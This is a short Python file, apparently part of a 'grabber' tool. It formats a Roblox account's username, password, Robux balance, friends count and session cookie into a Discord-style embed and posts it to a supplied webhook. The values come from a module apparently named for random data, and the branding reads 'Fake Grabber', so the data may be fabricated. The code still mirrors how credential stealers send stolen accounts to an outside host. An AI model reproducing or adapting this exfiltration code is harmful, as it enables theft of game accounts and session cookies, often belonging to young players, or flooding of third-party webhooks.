from z.rnd import *
from requests import post


def RobloxC(webhook):

    RobloxCookie = {
        "embeds": [
            {
            "color": 2303786,
            "fields": [  
                {
                    "name": "Username",
                    "value": f"`{ruser}`",
                    "inline": True
                },
                {
                    "name": "Password:",
                    "value": f"`{rpssw}`",
                    "inline": True
                },
                {
                    "name": "Robux:",
                    "value": f"`{robux}`",
                    "inline": True
                },
                {
                    "name": "Friends:",
                    "value": f"`{friends}`",
                    "inline": True
                },
                {
                    "name": "Cookie:",
                    "value": f"`{rcookie}`",
                    "inline": False
                },
                ],
            "footer": {
                "text": f"Fake Grabber · Roblox Data · {vbv}",
                "icon_url": "https://media.tenor.com/noyn9bef3O8AAAAd/zerotwo-dance.gif"
                },
            }
        ],
        "avatar_url": "https://media.tenor.com/noyn9bef3O8AAAAd/zerotwo-dance.gif",
        "username": "Fake Grabber",
        "attachments": []
        }

    post(webhook, json=RobloxCookie)